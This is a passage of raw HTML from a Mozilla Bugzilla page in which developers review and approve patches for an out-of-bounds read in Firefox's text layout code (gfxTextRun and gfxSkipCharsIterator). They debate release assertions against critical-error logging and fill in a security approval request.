                  aria-label="Collapse" aria-expanded="true"
                  data-strings='{ "collapse_label": "Collapse", "expand_label": "Expanded" }'>
            <span class="icon" aria-hidden="true"></span>
          </button>
        </div></td>
      </tr>

      <tr id="cr-20" >
        <td>
          <h3 class="change-name">
            <a href="/show_bug.cgi?id=1343552#c20">Comment 20</a>
          </h3>
          &bull;
          <div class="change-time"><span class="rel-time" title="2017-03-04 03:37 PST" data-time="1488627420">5 years ago</span>
          </div>
        </td>
      </tr>

      <tr id="ctag-20">
        <td colspan="2" class="comment-tags">
        </td>
      </tr>
    </table>

    
  </div><div id="att-8843571"
         class="attachment patch obsolete"
         data-id="8843571" itemscope itemtype="http://schema.org/MediaObject">
      <meta itemprop="name" content="safer-skipchars">
      <meta itemprop="contentSize" content="1283">
      <meta itemprop="encodingFormat" content="text/plain">
      <div class="label">
        Attached patch
          <meta itemprop="contentUrl" content="attachment.cgi?id=8843571">
          <a class="link" href="attachment.cgi?id=8843571&amp;action=diff">
        <span id="att-8843571-description" itemprop="description">Make gfxSkipCharsIterator a bit more robust</span></a> (obsolete)
        — <a href="attachment.cgi?id=8843571&amp;action=edit" itemprop="url">Details</a>
          — <a href="/page.cgi?id=splinter.html&ignore=&bug=1343552&attachment=8843571">Splinter Review</a>
      </div>
    </div>

  
    <pre
        class="comment-text  "
        id="ct-20" data-comment-id="12115864">Your diagnosis &amp; patch for the problem here looks good; but I was wondering if it might be worth also doing something like this, to make gfxSkipCharsIterator handle bad situations more safely. AFAICT this would have prevented the OOB access here, leaving us with potentially incorrect layout but not an actual crash or vulnerability. In a debug build, it would still assert (as was already happening), so we're not just papering over the underlying bug, but a release build would have a better chance of surviving it safely. Given our history of bugs where we have textruns that don't quite match the content they're supposed to, this may be a useful mitigation?</pre><div class="activity"><div class="change">
        <a href="/attachment.cgi?id=8843571&amp;action=edit"
           title="Make gfxSkipCharsIterator a bit more robust"
           class=""
        >Attachment #8843571</a> -
        Flags: feedback?(mats)</div></div></div><div class="change-set" id="c21"><div class="comment" data-id="12118365" data-no="21"
       data-tags="">
    
    <table class="layout-table change-head assignee" id="ch-21" role="presentation">
      <tr>
          <td rowspan="2" class="change-gravatar"><div class="vcard vcard_5168" id="a96155_75935"><img src="https://secure.gravatar.com/avatar/04f630b96bdc20c8df8b8ab26a3a302e?d=mm&size=64" class="gravatar" width="32" height="32">
</div>
          </td>

          <td class="change-author"><div class="vcard vcard_5168" id="a96155_75935"><a class="email " href="/user_profile?user_id=5168" > <span class="fna">Mats Palmgren (:mats)</span></a>
</div>
              <span class="user-role">Assignee</span>
          </td>

        <td rowspan="2" class="comment-actions"><div role="group">
          <button type="button" class="change-spinner minor iconic" id="cs-21"
                  aria-label="Collapse" aria-expanded="true"
                  data-strings='{ "collapse_label": "Collapse", "expand_label": "Expanded" }'>
            <span class="icon" aria-hidden="true"></span>
          </button>
        </div></td>
      </tr>

      <tr id="cr-21" >
        <td>
          <h3 class="change-name">
            <a href="/show_bug.cgi?id=1343552#c21">Comment 21</a>
          </h3>
          &bull;
          <div class="change-time"><span class="rel-time" title="2017-03-06 03:46 PST" data-time="1488800763">5 years ago</span>
          </div>
        </td>
      </tr>

      <tr id="ctag-21">
        <td colspan="2" class="comment-tags">
        </td>
      </tr>
    </table>

    
  </div><pre
        class="comment-text  "
        id="ct-21" data-comment-id="12118365">Comment on <span class="bz_obsolete"><a href="/attachment.cgi?id=8843571" name="attach_8843571" title="Make gfxSkipCharsIterator a bit more robust">attachment 8843571</a> <a href="/attachment.cgi?id=8843571&amp;action=edit" title="Make gfxSkipCharsIterator a bit more robust">[details]</a> <a href="/attachment.cgi?id=8843571&amp;action=diff" title="Make gfxSkipCharsIterator a bit more robust">[diff]</a></span> <a href='/page.cgi?id=splinter.html&amp;ignore=&amp;bug=1343552&amp;attachment=8843571'>[review]</a>
Make gfxSkipCharsIterator a bit more robust

This is a good idea.  The problem is we don't really know what the caller
does with the faulty offset/textrun after this, so a MOZ_RELEASE_ASSERT
is generally safer.  I see three alternatives:

A. handle it + MOZ_ASSERT (this patch)
B. A + gfxCriticalError (or some such - to get a signal from release
   builds that this occurs in the wild)
C. MOZ_RELEASE_ASSERT

I think I'd prefer C in this case, because that increases the chance of
detecting any remaining/future errors.  I think fuzz testers generally
use non-DEBUG builds, so they wouldn't catch an error with A (unless
there is also a detectable subsequent error).</pre><div class="activity"><div class="change">
        <a href="/attachment.cgi?id=8843571&amp;action=edit"
           title="Make gfxSkipCharsIterator a bit more robust"
           class=""
        >Attachment #8843571</a> -
        Flags: feedback?(mats) &rarr; feedback+</div></div></div><div class="change-set" id="c22"><div class="comment" data-id="12118379" data-no="22"
       data-tags="">
    
    <table class="layout-table change-head assignee" id="ch-22" role="presentation">
      <tr>
          <td rowspan="2" class="change-gravatar"><div class="vcard vcard_5168" id="a96155_75935"><img src="https://secure.gravatar.com/avatar/04f630b96bdc20c8df8b8ab26a3a302e?d=mm&size=64" class="gravatar" width="32" height="32">
</div>
          </td>

          <td class="change-author"><div class="vcard vcard_5168" id="a96155_75935"><a class="email " href="/user_profile?user_id=5168" > <span class="fna">Mats Palmgren (:mats)</span></a>
</div>
              <span class="user-role">Assignee</span>
          </td>

        <td rowspan="2" class="comment-actions"><div role="group">
          <button type="button" class="change-spinner minor iconic" id="cs-22"
                  aria-label="Collapse" aria-expanded="true"
                  data-strings='{ "collapse_label": "Collapse", "expand_label": "Expanded" }'>
            <span class="icon" aria-hidden="true"></span>
          </button>
        </div></td>
      </tr>

      <tr id="cr-22" >
        <td>
          <h3 class="change-name">
            <a href="/show_bug.cgi?id=1343552#c22">Comment 22</a>
          </h3>
          &bull;
          <div class="change-time"><span class="rel-time" title="2017-03-06 03:54 PST" data-time="1488801279">5 years ago</span>
          </div>
        </td>
      </tr>

      <tr id="ctag-22">
        <td colspan="2" class="comment-tags">
        </td>
      </tr>
    </table>

    
  </div><div id="att-8843917"
         class="attachment patch"
         data-id="8843917" itemscope itemtype="http://schema.org/MediaObject">
      <meta itemprop="name" content="flowlength">
      <meta itemprop="contentSize" content="2408">
      <meta itemprop="encodingFormat" content="text/plain">
      <div class="label">
        Attached patch
          <meta itemprop="contentUrl" content="attachment.cgi?id=8843917">
          <a class="link" href="attachment.cgi?id=8843917&amp;action=diff">
        <span id="att-8843917-description" itemprop="description">part 1 - Invalidate the cached flow length when the next-in-flow/continuation changes.</span></a>
        — <a href="attachment.cgi?id=8843917&amp;action=edit" itemprop="url">Details</a>
          — <a href="/page.cgi?id=splinter.html&ignore=&bug=1343552&attachment=8843917">Splinter Review</a>
      </div>
    </div>

  
    <pre
        class="comment-text  "
        id="ct-22" data-comment-id="12118379">This should fix this bug and be very low risk to uplift.
We should also take some variation of your patch as part 2.

(I still think there's something off with the logic in
nsContinuingTextFrame::DestroyFrom, but it would be a more
risky change and I'll have to think about that more.)</pre><div class="activity"><div class="change">Assignee: nobody &rarr; mats</div><div class="change">
        <a href="/attachment.cgi?id=8843464&amp;action=edit"
           title="wip2"
           class=""
        >Attachment #8843464</a> -
        Attachment is obsolete: true</div><div class="change">
        <a href="/attachment.cgi?id=8843917&amp;action=edit"
           title="part 1 - Invalidate the cached flow length when the next-in-flow/continuation changes."
           class=""
        >Attachment #8843917</a> -
        Flags: review?(jfkthame)</div></div></div><div class="change-set" id="c23"><div class="comment" data-id="12118977" data-no="23"
       data-tags="">
    
    <table class="layout-table change-head " id="ch-23" role="presentation">
      <tr>
          <td rowspan="2" class="change-gravatar"><div class="vcard vcard_329583" id="a96155_75935"><img src="https://secure.gravatar.com/avatar/e0f9759e1d7514ae4adfd806869e3c5d?d=mm&size=64" class="gravatar" width="32" height="32">
</div>
          </td>

          <td class="change-author"><div class="vcard vcard_329583" id="a96155_75935"><a class="email " href="/user_profile?user_id=329583" > <span class="fna">Jonathan Kew (:jfkthame)</span></a>
</div>
          </td>

        <td rowspan="2" class="comment-actions"><div role="group">
          <button type="button" class="change-spinner minor iconic" id="cs-23"
                  aria-label="Collapse" aria-expanded="true"
                  data-strings='{ "collapse_label": "Collapse", "expand_label": "Expanded" }'>
            <span class="icon" aria-hidden="true"></span>
          </button>
        </div></td>
      </tr>

      <tr id="cr-23" >
        <td>
          <h3 class="change-name">
            <a href="/show_bug.cgi?id=1343552#c23">Comment 23</a>
          </h3>
          &bull;
          <div class="change-time"><span class="rel-time" title="2017-03-06 07:46 PST" data-time="1488815202">5 years ago</span>
          </div>
        </td>
      </tr>

      <tr id="ctag-23">
        <td colspan="2" class="comment-tags">
        </td>
      </tr>
    </table>

    
  </div><pre
        class="comment-text  "
        id="ct-23" data-comment-id="12118977">Comment on <span class=""><a href="/attachment.cgi?id=8843917" name="attach_8843917" title="part 1 - Invalidate the cached flow length when the next-in-flow/continuation changes.">attachment 8843917</a> <a href="/attachment.cgi?id=8843917&amp;action=edit" title="part 1 - Invalidate the cached flow length when the next-in-flow/continuation changes.">[details]</a> <a href="/attachment.cgi?id=8843917&amp;action=diff" title="part 1 - Invalidate the cached flow length when the next-in-flow/continuation changes.">[diff]</a></span> <a href='/page.cgi?id=splinter.html&amp;ignore=&amp;bug=1343552&amp;attachment=8843917'>[review]</a>
part 1 - Invalidate the cached flow length when the next-in-flow/continuation changes.

Review of <span class=""><a href="/attachment.cgi?id=8843917" name="attach_8843917" title="part 1 - Invalidate the cached flow length when the next-in-flow/continuation changes.">attachment 8843917</a> <a href="/attachment.cgi?id=8843917&amp;action=edit" title="part 1 - Invalidate the cached flow length when the next-in-flow/continuation changes.">[details]</a> <a href="/attachment.cgi?id=8843917&amp;action=diff" title="part 1 - Invalidate the cached flow length when the next-in-flow/continuation changes.">[diff]</a></span> <a href='/page.cgi?id=splinter.html&amp;ignore=&amp;bug=1343552&amp;attachment=8843917'>[review]</a>:
-----------------------------------------------------------------

Agreed, this looks very low-risk, so should be fine to uplift.</pre><div class="activity"><div class="change">
        <a href="/attachment.cgi?id=8843917&amp;action=edit"
           title="part 1 - Invalidate the cached flow length when the next-in-flow/continuation changes."
           class=""
        >Attachment #8843917</a> -
        Flags: review?(jfkthame) &rarr; review+</div></div></div><div class="change-set" id="c24"><div class="comment" data-id="12119165" data-no="24"
       data-tags="">
    
    <table class="layout-table change-head " id="ch-24" role="presentation">
      <tr>
          <td rowspan="2" class="change-gravatar"><div class="vcard vcard_329583" id="a96155_75935"><img src="https://secure.gravatar.com/avatar/e0f9759e1d7514ae4adfd806869e3c5d?d=mm&size=64" class="gravatar" width="32" height="32">
</div>
          </td>

          <td class="change-author"><div class="vcard vcard_329583" id="a96155_75935"><a class="email " href="/user_profile?user_id=329583" > <span class="fna">Jonathan Kew (:jfkthame)</span></a>
</div>
          </td>

        <td rowspan="2" class="comment-actions"><div role="group">
          <button type="button" class="change-spinner minor iconic" id="cs-24"
                  aria-label="Collapse" aria-expanded="true"
                  data-strings='{ "collapse_label": "Collapse", "expand_label": "Expanded" }'>
            <span class="icon" aria-hidden="true"></span>
          </button>
        </div></td>
      </tr>

      <tr id="cr-24" >
        <td>
          <h3 class="change-name">
            <a href="/show_bug.cgi?id=1343552#c24">Comment 24</a>
          </h3>
          &bull;
          <div class="change-time"><span class="rel-time" title="2017-03-06 08:42 PST" data-time="1488818526">5 years ago</span>
          </div>
        </td>
      </tr>

      <tr id="ctag-24">
        <td colspan="2" class="comment-tags">
        </td>
      </tr>
    </table>

    
  </div><pre
        class="comment-text  "
        id="ct-24" data-comment-id="12119165">(In reply to Mats Palmgren (:mats) from <a class="bz_bug_link
          bz_status_VERIFIED bz_closed"
   title="VERIFIED FIXED - ASAN: out-of-bounds read in gfxTextRun (after &quot;ASSERTION: Invalid offset&quot; and &quot;ASSERTION: Substring out of range&quot;)"
   href="/show_bug.cgi?id=1343552#c21">comment #21</a>)
<span class="quote">&gt; Comment on <span class="bz_obsolete"><a href="/attachment.cgi?id=8843571" name="attach_8843571" title="Make gfxSkipCharsIterator a bit more robust">attachment 8843571</a> <a href="/attachment.cgi?id=8843571&amp;action=edit" title="Make gfxSkipCharsIterator a bit more robust">[details]</a> <a href="/attachment.cgi?id=8843571&amp;action=diff" title="Make gfxSkipCharsIterator a bit more robust">[diff]</a></span> <a href='/page.cgi?id=splinter.html&amp;ignore=&amp;bug=1343552&amp;attachment=8843571'>[review]</a>
&gt; Make gfxSkipCharsIterator a bit more robust
&gt; 
&gt; This is a good idea.  The problem is we don't really know what the caller
&gt; does with the faulty offset/textrun after this, so a MOZ_RELEASE_ASSERT
&gt; is generally safer.  I see three alternatives:
&gt; 
&gt; A. handle it + MOZ_ASSERT (this patch)
&gt; B. A + gfxCriticalError (or some such - to get a signal from release
&gt;    builds that this occurs in the wild)
&gt; C. MOZ_RELEASE_ASSERT
&gt; 
&gt; I think I'd prefer C in this case, because that increases the chance of
&gt; detecting any remaining/future errors.  I think fuzz testers generally
&gt; use non-DEBUG builds, so they wouldn't catch an error with A (unless
&gt; there is also a detectable subsequent error).</span >

Some fuzz testers do run debug builds, don't they? I'm sure I've seen plenty of fuzzer-generated bug reports that are essentially &quot;this testcase triggers a [debug-mode] assertion&quot;.

While MOZ_RELEASE_ASSERT is safest, I'm a little nervous of doing it right away, as it might result in more frequent crashes for situations that are currently fairly harmless in the wild. E.g. consider an off-by-one error that causes us to try and access character/glyph data one position past the end of the textrun; this might result in slightly incorrect layout or rendering, but seems unlikely to be exploitable. If we have such a bug, we'd certainly want to fix it, but I'm not sure it would justify forcing a release-mode crash.

At this point I'd lean towards adding a gfxCriticalError, so that we can see if this ever appears in the wild, and then re-assess accordingly.</pre></div><div class="change-set" id="c25"><div class="comment" data-id="12119395" data-no="25"
       data-tags="">
    
    <table class="layout-table change-head " id="ch-25" role="presentation">
      <tr>
          <td rowspan="2" class="change-gravatar"><div class="vcard vcard_329583" id="a96155_75935"><img src="https://secure.gravatar.com/avatar/e0f9759e1d7514ae4adfd806869e3c5d?d=mm&size=64" class="gravatar" width="32" height="32">
</div>
          </td>

          <td class="change-author"><div class="vcard vcard_329583" id="a96155_75935"><a class="email " href="/user_profile?user_id=329583" > <span class="fna">Jonathan Kew (:jfkthame)</span></a>
</div>
          </td>

        <td rowspan="2" class="comment-actions"><div role="group">
          <button type="button" class="change-spinner minor iconic" id="cs-25"
                  aria-label="Collapse" aria-expanded="true"
                  data-strings='{ "collapse_label": "Collapse", "expand_label": "Expanded" }'>
            <span class="icon" aria-hidden="true"></span>
          </button>
        </div></td>
      </tr>

      <tr id="cr-25" >
        <td>
          <h3 class="change-name">
            <a href="/show_bug.cgi?id=1343552#c25">Comment 25</a>
          </h3>
          &bull;
          <div class="change-time"><span class="rel-time" title="2017-03-06 09:39 PST" data-time="1488821942">5 years ago</span>
          </div>
        </td>
      </tr>

      <tr id="ctag-25">
        <td colspan="2" class="comment-tags">
        </td>
      </tr>
    </table>

    
  </div><div id="att-8844051"
         class="attachment patch"
         data-id="8844051" itemscope itemtype="http://schema.org/MediaObject">
      <meta itemprop="name" content="safer-skipchars">
      <meta itemprop="contentSize" content="1252">
      <meta itemprop="encodingFormat" content="text/plain">
      <div class="label">
        Attached patch
          <meta itemprop="contentUrl" content="attachment.cgi?id=8844051">
          <a class="link" href="attachment.cgi?id=8844051&amp;action=diff">
        <span id="att-8844051-description" itemprop="description">part 2 - Record attempted misuse of gfxSkipCharsIterator via a gfxCriticalError</span></a>
        — <a href="attachment.cgi?id=8844051&amp;action=edit" itemprop="url">Details</a>
          — <a href="/page.cgi?id=splinter.html&ignore=&bug=1343552&attachment=8844051">Splinter Review</a>
      </div>
    </div><div class="activity"><div class="change">
        <a href="/attachment.cgi?id=8844051&amp;action=edit"
           title="part 2 - Record attempted misuse of gfxSkipCharsIterator via a gfxCriticalError"
           class=""
        >Attachment #8844051</a> -
        Flags: review?(mats)</div></div></div><div class="change-set" id="a438136_329583"><div class="change" id="aa438136_329583">
    <table class="layout-table change-head " role="presentation">
      <tr>
        <td rowspan="2" class="change-gravatar"><div class="vcard vcard_329583" id="a438136_329583"><img src="https://secure.gravatar.com/avatar/e0f9759e1d7514ae4adfd806869e3c5d?d=mm&size=64" class="gravatar" width="32" height="32">
</div>
        </td>
        <td class="change-author"><div class="vcard vcard_329583" id="a438136_329583"><a class="email " href="/user_profile?user_id=329583" > <span class="fna">Jonathan Kew (:jfkthame)</span></a>
</div>
        </td>
        <td rowspan="2" class="comment-actions"><div role="group">
          <button type="button" class="change-spinner minor iconic" id="as-a438136_329583"
                  aria-label="Collapse" aria-expanded="true"
                  data-strings='{ "collapse_label": "Collapse", "expand_label": "Expanded" }'>
            <span class="icon" aria-hidden="true"></span>
          </button>
        </div></td>
      </tr>
      <tr id="ar-a438136_329583">
        <td>
          <h3 class="change-name">
            <a href="/show_bug.cgi?id=1343552#a438136_329583">Updated</a>
          </h3>
          &bull;
          <div class="change-time"><span class="rel-time" title="2017-03-06 09:39 PST" data-time="1488821945">5 years ago</span>
          </div>
        </td>
      </tr>
    </table>
  </div><div class="activity"><div class="change">
        <a href="/attachment.cgi?id=8843571&amp;action=edit"
           title="Make gfxSkipCharsIterator a bit more robust"
           class=""
        >Attachment #8843571</a> -
        Attachment is obsolete: true</div></div></div><div class="change-set" id="c26"><div class="comment" data-id="12119489" data-no="26"
       data-tags="">
    
    <table class="layout-table change-head assignee" id="ch-26" role="presentation">
      <tr>
          <td rowspan="2" class="change-gravatar"><div class="vcard vcard_5168" id="a438136_329583"><img src="https://secure.gravatar.com/avatar/04f630b96bdc20c8df8b8ab26a3a302e?d=mm&size=64" class="gravatar" width="32" height="32">
</div>
          </td>

          <td class="change-author"><div class="vcard vcard_5168" id="a438136_329583"><a class="email " href="/user_profile?user_id=5168" > <span class="fna">Mats Palmgren (:mats)</span></a>
</div>
              <span class="user-role">Assignee</span>
          </td>

        <td rowspan="2" class="comment-actions"><div role="group">
          <button type="button" class="change-spinner minor iconic" id="cs-26"
                  aria-label="Collapse" aria-expanded="true"
                  data-strings='{ "collapse_label": "Collapse", "expand_label": "Expanded" }'>
            <span class="icon" aria-hidden="true"></span>
          </button>
        </div></td>
      </tr>

      <tr id="cr-26" >
        <td>
          <h3 class="change-name">
            <a href="/show_bug.cgi?id=1343552#c26">Comment 26</a>
          </h3>
          &bull;
          <div class="change-time"><span class="rel-time" title="2017-03-06 10:00 PST" data-time="1488823250">5 years ago</span>
          </div>
        </td>
      </tr>

      <tr id="ctag-26">
        <td colspan="2" class="comment-tags">
        </td>
      </tr>
    </table>

    
  </div><pre
        class="comment-text  "
        id="ct-26" data-comment-id="12119489"><span class="quote">&gt; Some fuzz testers do run debug builds, don't they?</span >

Yes, I think our fuzz team do, but I think external testers usually use ASAN
or plain Opt builds.  IME, they also tend to find different sets of bugs, as
the recent streak of bidi-related bugs show.

<span class="quote">&gt; E.g. consider an off-by-one error that causes us to try and access character/glyph data
&gt; one position past the end of the textrun; this might result in slightly incorrect layout
&gt; or rendering, but seems unlikely to be exploitable.</span >

Right, but this off-by-one error is a sign that our data is in an inconsistent
state so all bets are off.  There's no way of knowing whether this state could
lead to more serious issues.

I think the correct way to handle out-of-bounds errors in general is process
termination - that's how it's handled in nsTArray for example.  Considering
our user base is increasingly on e10s it's not that catastrophic for the user.

<span class="quote">&gt; At this point I'd lean towards adding a gfxCriticalError</span >

Fair enough, given that we don't handle it at all at the moment we can
start with B and then replace it with C later on.</pre></div><div class="change-set" id="c27"><div class="comment" data-id="12119490" data-no="27"
       data-tags="">
    
    <table class="layout-table change-head assignee" id="ch-27" role="presentation">
      <tr>
          <td rowspan="2" class="change-gravatar"><div class="vcard vcard_5168" id="a438136_329583"><img src="https://secure.gravatar.com/avatar/04f630b96bdc20c8df8b8ab26a3a302e?d=mm&size=64" class="gravatar" width="32" height="32">
</div>
          </td>

          <td class="change-author"><div class="vcard vcard_5168" id="a438136_329583"><a class="email " href="/user_profile?user_id=5168" > <span class="fna">Mats Palmgren (:mats)</span></a>
</div>
              <span class="user-role">Assignee</span>
          </td>

        <td rowspan="2" class="comment-actions"><div role="group">
          <button type="button" class="change-spinner minor iconic" id="cs-27"
                  aria-label="Collapse" aria-expanded="true"
                  data-strings='{ "collapse_label": "Collapse", "expand_label": "Expanded" }'>
            <span class="icon" aria-hidden="true"></span>
          </button>
        </div></td>
      </tr>

      <tr id="cr-27" >
        <td>
          <h3 class="change-name">
            <a href="/show_bug.cgi?id=1343552#c27">Comment 27</a>
          </h3>
          &bull;
          <div class="change-time"><span class="rel-time" title="2017-03-06 10:01 PST" data-time="1488823284">5 years ago</span>
          </div>
        </td>
      </tr>

      <tr id="ctag-27">
        <td colspan="2" class="comment-tags">
        </td>
      </tr>
    </table>

    
  </div><pre
        class="comment-text  "
        id="ct-27" data-comment-id="12119490">Comment on <span class=""><a href="/attachment.cgi?id=8844051" name="attach_8844051" title="part 2 - Record attempted misuse of gfxSkipCharsIterator via a gfxCriticalError">attachment 8844051</a> <a href="/attachment.cgi?id=8844051&amp;action=edit" title="part 2 - Record attempted misuse of gfxSkipCharsIterator via a gfxCriticalError">[details]</a> <a href="/attachment.cgi?id=8844051&amp;action=diff" title="part 2 - Record attempted misuse of gfxSkipCharsIterator via a gfxCriticalError">[diff]</a></span> <a href='/page.cgi?id=splinter.html&amp;ignore=&amp;bug=1343552&amp;attachment=8844051'>[review]</a>
part 2 - Record attempted misuse of gfxSkipCharsIterator via a gfxCriticalError

Thanks, r=mats</pre><div class="activity"><div class="change">
        <a href="/attachment.cgi?id=8844051&amp;action=edit"
           title="part 2 - Record attempted misuse of gfxSkipCharsIterator via a gfxCriticalError"
           class=""
        >Attachment #8844051</a> -
        Flags: review?(mats) &rarr; review+</div></div></div><div class="change-set" id="c28"><div class="comment" data-id="12119536" data-no="28"
       data-tags="">
    
    <table class="layout-table change-head assignee" id="ch-28" role="presentation">
      <tr>
          <td rowspan="2" class="change-gravatar"><div class="vcard vcard_5168" id="a438136_329583"><img src="https://secure.gravatar.com/avatar/04f630b96bdc20c8df8b8ab26a3a302e?d=mm&size=64" class="gravatar" width="32" height="32">
</div>
          </td>

          <td class="change-author"><div class="vcard vcard_5168" id="a438136_329583"><a class="email " href="/user_profile?user_id=5168" > <span class="fna">Mats Palmgren (:mats)</span></a>
</div>
              <span class="user-role">Assignee</span>
          </td>

        <td rowspan="2" class="comment-actions"><div role="group">
          <button type="button" class="change-spinner minor iconic" id="cs-28"
                  aria-label="Collapse" aria-expanded="true"
                  data-strings='{ "collapse_label": "Collapse", "expand_label": "Expanded" }'>
            <span class="icon" aria-hidden="true"></span>
          </button>
        </div></td>
      </tr>

      <tr id="cr-28" >
        <td>
          <h3 class="change-name">
            <a href="/show_bug.cgi?id=1343552#c28">Comment 28</a>
          </h3>
          &bull;
          <div class="change-time"><span class="rel-time" title="2017-03-06 10:09 PST" data-time="1488823772">5 years ago</span>
          </div>
        </td>
      </tr>

      <tr id="ctag-28">
        <td colspan="2" class="comment-tags">
        </td>
      </tr>
    </table>

    
  </div><pre
        class="comment-text  "
        id="ct-28" data-comment-id="12119536">Comment on <span class=""><a href="/attachment.cgi?id=8843917" name="attach_8843917" title="part 1 - Invalidate the cached flow length when the next-in-flow/continuation changes.">attachment 8843917</a> <a href="/attachment.cgi?id=8843917&amp;action=edit" title="part 1 - Invalidate the cached flow length when the next-in-flow/continuation changes.">[details]</a> <a href="/attachment.cgi?id=8843917&amp;action=diff" title="part 1 - Invalidate the cached flow length when the next-in-flow/continuation changes.">[diff]</a></span> <a href='/page.cgi?id=splinter.html&amp;ignore=&amp;bug=1343552&amp;attachment=8843917'>[review]</a>
part 1 - Invalidate the cached flow length when the next-in-flow/continuation changes.

[Security approval request comment]
How easily could an exploit be constructed based on the patch?

That would probably be hard.

Do comments in the patch, the check-in comment, or tests included in the patch paint a bulls-eye on the security problem?

There's no direct correlation with what kind of content/conditions
would cause the crash.

Which older supported branches are affected by this flaw?

All.

Do you have backports for the affected branches? If not, how different, hard to create, and risky will they be?

Should be very easy to backport.

How likely is this patch to cause regressions; how much testing does it need?

Very low risk, we're just ditching a stale cached value in part 1, and adding
an out-of-bounds runtime check in part 2.</pre><div class="activity"><div class="change">
        <a href="/attachment.cgi?id=8843917&amp;action=edit"
           title="part 1 - Invalidate the cached flow length when the next-in-flow/continuation changes."
           class=""
        >Attachment #8843917</a> -
        Flags: sec-approval?</div></div></div><div class="change-set" id="a440030_5168"><div class="change" id="aa440030_5168">
    <table class="layout-table change-head assignee" role="presentation">
      <tr>
        <td rowspan="2" class="change-gravatar"><div class="vcard vcard_5168" id="a440030_5168"><img src="https://secure.gravatar.com/avatar/04f630b96bdc20c8df8b8ab26a3a302e?d=mm&size=64" class="gravatar" width="32" height="32">
</div>
        </td>
        <td class="change-author"><div class="vcard vcard_5168" id="a440030_5168"><a class="email " href="/user_profile?user_id=5168" > <span class="fna">Mats Palmgren (:mats)</span></a>
</div>
            <span class="user-role">Assignee</span>
        </td>
        <td rowspan="2" class="comment-actions"><div role="group">
          <button type="button" class="change-spinner minor iconic" id="as-a440030_5168"
                  aria-label="Collapse" aria-expanded="true"
                  data-strings='{ "collapse_label": "Collapse", "expand_label": "Expanded" }'>
            <span class="icon" aria-hidden="true"></span>
          </button>
        </div></td>
      </tr>
      <tr id="ar-a440030_5168">
        <td>
          <h3 class="change-name">
            <a href="/show_bug.cgi?id=1343552#a440030_5168">Updated</a>
          </h3>
          &bull;
          <div class="change-time"><span class="rel-time" title="2017-03-06 10:10 PST" data-time="1488823839">5 years ago</span>
          </div>
        </td>
      </tr>
    </table>
  </div><div class="activity"><div class="change">
        <a href="/attachment.cgi?id=8843917&amp;action=edit"
           title="part 1 - Invalidate the cached flow length when the next-in-flow/continuation changes."
           class=""
        >Attachment #8843917</a> -
        Attachment description: fix &rarr; part 1 - Invalidate the cached flow length when the next-in-flow/continuation changes.</div></div></div><div class="change-set" id="a440276_5168"><div class="change" id="aa440276_5168">
    <table class="layout-table change-head assignee" role="presentation">
      <tr>
        <td rowspan="2" class="change-gravatar"><div class="vcard vcard_5168" id="a440276_5168"><img src="https://secure.gravatar.com/avatar/04f630b96bdc20c8df8b8ab26a3a302e?d=mm&size=64" class="gravatar" width="32" height="32">
</div>
        </td>
        <td class="change-author"><div class="vcard vcard_5168" id="a440276_5168"><a class="email " href="/user_profile?user_id=5168" > <span class="fna">Mats Palmgren (:mats)</span></a>
</div>
            <span class="user-role">Assignee</span>
        </td>
        <td rowspan="2" class="comment-actions"><div role="group">
          <button type="button" class="change-spinner minor iconic" id="as-a440276_5168"
                  aria-label="Collapse" aria-expanded="true"
                  data-strings='{ "collapse_label": "Collapse", "expand_label": "Expanded" }'>
            <span class="icon" aria-hidden="true"></span>
          </button>
        </div></td>
      </tr>
      <tr id="ar-a440276_5168">
        <td>
          <h3 class="change-name">
            <a href="/show_bug.cgi?id=1343552#a440276_5168">Updated</a>
          </h3>
          &bull;
          <div class="change-time"><span class="rel-time" title="2017-03-06 10:14 PST" data-time="1488824085">5 years ago</span>
          </div>
        </td>
      </tr>
    </table>
  </div><div class="activity"><div class="change">Severity: normal &rarr; critical</div><div class="change">Component: Graphics: Text &rarr; Layout: Text</div><div class="change">Keywords: <a href="/buglist.cgi?keywords=crash&amp;resolution=---">crash</a></div><div class="change">OS: Unspecified &rarr; All</div><div class="change">Hardware: Unspecified &rarr; All</div></div></div><div class="change-set" id="a440398_5168"><div class="change" id="aa440398_5168">
    <table class="layout-table change-head assignee" role="presentation">
      <tr>
        <td rowspan="2" class="change-gravatar"><div class="vcard vcard_5168" id="a440398_5168"><img src="https://secure.gravatar.com/avatar/04f630b96bdc20c8df8b8ab26a3a302e?d=mm&size=64" class="gravatar" width="32" height="32">
</div>
        </td>
        <td class="change-author"><div class="vcard vcard_5168" id="a440398_5168"><a class="email " href="/user_profile?user_id=5168" > <span class="fna">Mats Palmgren (:mats)</span></a>
</div>
            <span class="user-role">Assignee</span>
        </td>
        <td rowspan="2" class="comment-actions"><div role="group">
          <button type="button" class="change-spinner minor iconic" id="as-a440398_5168"
                  aria-label="Collapse" aria-expanded="true"
                  data-strings='{ "collapse_label": "Collapse", "expand_label": "Expanded" }'>
            <span class="icon" aria-hidden="true"></span>
          </button>
        </div></td>
      </tr>
      <tr id="ar-a440398_5168">
        <td>
          <h3 class="change-name">
            <a href="/show_bug.cgi?id=1343552#a440398_5168">Updated</a>
          </h3>
          &bull;
          <div class="change-time"><span class="rel-time" title="2017-03-06 10:16 PST" data-time="1488824207">5 years ago</span>
          </div>
        </td>
      </tr>
    </table>
  </div><div class="activity"><div class="change">Flags: <span class="activity-deleted">needinfo?(milan)</span></div></div></div><div class="change-set" id="c29"><div class="comment" data-id="12124995" data-no="29"
       data-tags="">
    
    <table class="layout-table change-head " id="ch-29" role="presentation">
      <tr>
          <td rowspan="2" class="change-gravatar"><div class="vcard vcard_280903" id="a440398_5168"><img src="https://secure.gravatar.com/avatar/58211442c4cece862d7a7850637c4edc?d=mm&size=64" class="gravatar" width="32" height="32">
</div>
          </td>

          <td class="change-author"><div class="vcard vcard_280903" id="a440398_5168"><a class="email " href="/user_profile?user_id=280903" > <span class="fna">Al Billings [:abillings - ex-MoCo]</span></a>
</div>
          </td>

        <td rowspan="2" class="comment-actions"><div role="group">
          <button type="button" class="change-spinner minor iconic" id="cs-29"
                  aria-label="Collapse" aria-expanded="true"
                  data-strings='{ "collapse_label": "Collapse", "expand_label": "Expanded" }'>
            <span class="icon" aria-hidden="true"></span>
          </button>
        </div></td>
      </tr>

      <tr id="cr-29" >
        <td>
          <h3 class="change-name">
            <a href="/show_bug.cgi?id=1343552#c29">Comment 29</a>
          </h3>
          &bull;
          <div class="change-time"><span class="rel-time" title="2017-03-07 21:33 PST" data-time="1488951193">5 years ago</span>
          </div>
        </td>
      </tr>

      <tr id="ctag-29">
        <td colspan="2" class="comment-tags">
        </td>
